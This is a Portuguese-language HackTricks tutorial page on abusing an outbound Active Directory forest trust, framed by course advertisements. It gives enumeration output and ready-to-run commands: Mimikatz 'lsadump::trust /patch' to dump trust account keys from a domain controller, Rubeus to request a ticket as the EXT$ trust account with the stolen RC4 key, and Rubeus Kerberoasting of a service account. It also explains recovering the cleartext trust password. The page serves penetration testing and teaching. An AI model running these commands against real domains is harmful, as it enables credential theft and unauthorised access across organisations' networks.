# Domínio de Floresta Externa - Um Sentido (Saída)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

Neste cenário **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

## Enumeração

### Confiança de Saída
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Ataque à Conta de Confiança

Uma vulnerabilidade de segurança existe quando uma relação de confiança é estabelecida entre dois domínios, identificados aqui como domínio **A** e domínio **B**, onde o domínio **B** estende sua confiança ao domínio **A**. Nesse arranjo, uma conta especial é criada no domínio **A** para o domínio **B**, que desempenha um papel crucial no processo de autenticação entre os dois domínios. Esta conta, associada ao domínio **B**, é utilizada para criptografar tickets para acessar serviços entre os domínios.

O aspecto crítico a entender aqui é que a senha e o hash desta conta especial podem ser extraídos de um Controlador de Domínio no domínio **A** usando uma ferramenta de linha de comando. O comando para realizar essa ação é:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Esta extração é possível porque a conta, identificada com um **$** após seu nome, está ativa e pertence ao grupo "Domain Users" do domínio **A**, herdando assim as permissões associadas a este grupo. Isso permite que indivíduos se autentiquem no domínio **A** usando as credenciais desta conta.

**Warning:** É viável aproveitar essa situação para obter uma base no domínio **A** como um usuário, embora com permissões limitadas. No entanto, esse acesso é suficiente para realizar enumeração no domínio **A**.

Em um cenário onde `ext.local` é o domínio confiável e `root.local` é o domínio confiável, uma conta de usuário chamada `EXT$` seria criada dentro de `root.local`. Através de ferramentas específicas, é possível despejar as chaves de confiança do Kerberos, revelando as credenciais de `EXT$` em `root.local`. O comando para alcançar isso é:
```bash
lsadump::trust /patch
```
Seguindo isso, poderia-se usar a chave RC4 extraída para autenticar como `root.local\EXT$` dentro de `root.local` usando outro comando de ferramenta:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Esta etapa de autenticação abre a possibilidade de enumerar e até explorar serviços dentro de `root.local`, como realizar um ataque Kerberoast para extrair credenciais de contas de serviço usando:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Coletando a senha de confiança em texto claro

No fluxo anterior, foi utilizado o hash de confiança em vez da **senha em texto claro** (que também foi **extraída pelo mimikatz**).

A senha em texto claro pode ser obtida convertendo a saída \[ CLEAR ] do mimikatz de hexadecimal e removendo bytes nulos ‘\x00’:

![](<../../.gitbook/assets/image (938).png>)

Às vezes, ao criar um relacionamento de confiança, uma senha deve ser digitada pelo usuário para a confiança. Nesta demonstração, a chave é a senha original de confiança e, portanto, legível por humanos. À medida que a chave muda (a cada 30 dias), o texto claro não será legível por humanos, mas tecnicamente ainda utilizável.

A senha em texto claro pode ser usada para realizar autenticação regular como a conta de confiança, uma alternativa a solicitar um TGT usando a chave secreta Kerberos da conta de confiança. Aqui, consultando root.local a partir de ext.local para membros do Domain Admins:

![](<../../.gitbook/assets/image (792).png>)

## Referências

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
